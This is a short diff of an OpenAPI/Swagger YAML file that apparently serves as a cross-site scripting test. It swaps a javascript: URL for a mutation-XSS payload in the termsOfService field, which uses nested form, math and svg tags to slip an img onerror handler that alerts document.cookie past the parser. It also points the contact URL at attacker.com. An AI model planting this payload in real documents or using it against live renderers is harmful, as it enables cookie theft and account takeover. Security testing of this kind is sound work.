@@ -18,10 +18,11 @@ info:
         </div>
       </form>
     </div>
-  termsOfService: "'javascript:alert(1)"
+  termsOfService:  |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   contact: 
     name: "API Support"
-    url: "https://evil.com"
+    url: "https://attacker.com/"
     email: "bilalabbasuk@gmail.com"
 paths:
   /:
